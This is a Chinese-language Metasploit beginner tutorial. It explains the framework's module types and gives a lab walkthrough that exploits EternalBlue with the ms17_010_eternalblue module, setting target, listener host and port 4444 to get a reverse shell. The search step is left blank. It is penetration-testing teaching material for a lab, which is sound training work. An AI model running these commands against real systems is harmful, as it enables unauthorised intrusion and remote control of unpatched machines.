# Metasploit 101

Metasploit 框架（也称为 MSF）是一个免费、开源的漏洞利用框架，在渗透测试中被广泛使用。MSF 包含一系列针对已知漏洞的利用代码，不仅如此，它还允许你利用框架提供的各种库创建自己的漏洞利用代码。

## Metasploit 模块

以下模块是 Metasploit 的核心与灵魂，在开始使用 MSF 之前理解它们非常重要：

- **Exploit（漏洞利用）**：一段代码，执行时会触发目标上的漏洞。
- **Payload（载荷）**：在成功利用漏洞后在目标上运行的代码。它定义了我们需要在目标系统上获得的访问类型和可执行的操作。
- **Auxiliary（辅助模块）**：提供额外功能的模块，例如扫描、模糊测试、嗅探等等。
- **Encoder（编码器）**：用于混淆模块，以避免被防病毒软件或防火墙等保护机制检测。
- **Meterpreter**：一种利用基于 DLL 注入的内存暂存器（stager）的载荷。它提供了多种可以在目标上执行的功能，因此是一个非常受欢迎的选择。

## 入门指南

要开始使用，请运行以下命令：

如果 PostGRE 尚未启动：

```bash
sudo service postgresql start
```

如果是第一次启动 MSF：

```bash
msfdb init
```

启动 Metasploit：

```bash
msfconsole
```

## 如何使用 Metasploit

到目前为止，通过第 1 到第 4 课，你应该已经能够识别出存在潜在漏洞的服务。我们可以在 Metasploit 中搜索是否存在现有的漏洞利用代码。

例如，让我们尝试搜索与 EternalBlue 相关的漏洞利用，输入：


## 实验时间

让我们使用 Metasploit 利用 EternalBlue 漏洞。

首先，我们需要设置漏洞利用模块，输入：

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

执行以下命令可以查看该漏洞利用所需的配置信息——注意“Required”（必需）列：

```bash
show options
```

为了使此漏洞利用生效，我们需要配置：

- **RHOSTS**：目标的 IP 地址
- **LHOST**：我们机器的 IP 地址（必须能够被目标直接访问）
- **LPORT**：我们本地机器上用于监听反向 shell 的端口

```bash
set RHOSTS 10.150.150.11
set LHOST 10.66.66.18 （必须替换为你自己的 VPN IP 地址）
set LPORT 4444
```

完成配置后，启动漏洞利用！

```bash
run
```
